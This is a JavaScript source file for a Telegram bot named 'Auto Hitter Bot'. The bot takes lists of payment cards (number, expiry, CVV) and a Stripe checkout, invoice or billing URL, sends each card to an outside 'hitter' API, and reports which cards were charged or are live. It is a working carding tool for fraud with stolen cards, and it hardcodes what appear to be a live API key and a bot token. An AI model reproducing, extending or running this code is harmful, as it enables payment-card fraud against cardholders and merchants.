const { Telegraf } = require('telegraf');
const axios = require('axios');

const API_URL = "https://hitter1month.replit.app";
const API_KEY = "hitchk_86d5f00d4d0078e7db5e4bc68322362f798d04e6ba20569d";
const BOT_TOKEN = "8680374467:AAEcO6m-O6BOQD0mec7cyURfqQ8Ax2bphkk";

const bot = new Telegraf(BOT_TOKEN);
const sessionCache = new Map();

// Start Command
bot.start((ctx) => {
    const chat_id = ctx.chat.id;
    const msg = `🔥 <b>Auto Hitter Bot</b>

🆔 <b>Your Chat ID:</b> <code>${chat_id}</code> (Click to copy)

Send cards (one per line):
/co <url> <cards>
/inv <url> <cards>
/bill <url> <cards>

Card format:
4242424242424242|12|26|123
5500000000000004|06|27|456`;
    
    ctx.replyWithHTML(msg);
});

// Gate Commands
bot.command('co', (ctx) => runHit(ctx, 'checkout'));
bot.command('inv', (ctx) => runHit(ctx, 'invoice'));
bot.command('bill', (ctx) => runHit(ctx, 'billing'));

async function runHit(ctx, gate) {
    const text = ctx.message.text;
    const parts = text.split(/\s+/);
    
    if (parts.length < 3) {
        return ctx.reply(`Usage: /co <stripe_url> <card|mm|yy|cvv>\n\nExample:\n/co <url> 4242424242424242|12|26|123`);
    }

    const url = parts[1];
    const cardsRaw = text.substring(text.indexOf(parts[2]));
    const cards = cardsRaw.split('\n').map(c => c.trim()).filter(c => c.length > 0);

    if (cards.length === 0) {
        return ctx.reply("❌ No valid cards provided.");
    }

    const uid = ctx.from.id;
    const totalCards = cards.length;
    let waitMsg;
    
    try {
        waitMsg = await ctx.reply(`⏳ Checking ${totalCards} card(s)... (0/${totalCards})`);
    } catch (err) {
        return console.error('Failed to send initial message', err);
    }

    let chargedCount = 0;
    let liveCount = 0;
    const results = [];

    for (let i = 0; i < cards.length; i++) {
        const card = cards[i];
        
        try {
            await ctx.telegram.editMessageText(
                ctx.chat.id, waitMsg.message_id, undefined,
                `⏳ Checking ${totalCards} card(s)... (${i}/${totalCards})\n` +
                `✅ Charged: ${chargedCount} | ⚡ Live: ${liveCount}`
            );
        } catch (e) {}

        try {
            const response = await axios.post(`${API_URL}/hit/${gate}`, {
                url: url,
                card: card,
                session_cache: sessionCache.get(uid)
            }, {
                headers: { 'X-API-Key': API_KEY, 'Content-Type': 'application/json' },
                timeout: 120000
            });

            const resp = response.data;
            if (resp.session_cache) sessionCache.set(uid, resp.session_cache);

            const status = resp.status || 'error';
            if (['charged', 'approved'].includes(status)) chargedCount++;
            else if (status === 'live') liveCount++;

            results.push({ card, status, message: resp.message || 'Unknown' });
        } catch (e) {
            results.push({ card, status: 'error', message: e.message });
        }
    }

    // Final Summary
    const icons = { charged: "✅", approved: "✅", live: "⚡", live_declined: "❌", error: "⚠️", dead: "💀" };
    let reply = `📊 <b>Results: ${chargedCount} Charged, ${liveCount} Live, ${totalCards - (chargedCount + liveCount)} Dead</b>\n\n`;
    
    results.forEach(r => {
        const icon = icons[r.status] || "❓";
        const cParts = r.card.split('|');
        let display = r.card;
        if (cParts[0] && cParts[0].length > 10) {
            display = `${cParts[0].substring(0,6)}******${cParts[0].substring(cParts[0].length-4)}|${cParts[1]}|${cParts[2]}|${cParts[3]}`;
        }
        reply += `${icon} <code>${display}</code> - ${r.status.toUpperCase()}\n`;
    });

    if (reply.length > 4000) reply = reply.substring(0, 3990) + "\n... (truncated)";
    
    try {
        await ctx.telegram.editMessageText(ctx.chat.id, waitMsg.message_id, undefined, reply, { parse_mode: 'HTML' });
    } catch (err) {
        ctx.replyWithHTML(reply);
    }
}

module.exports = bot;
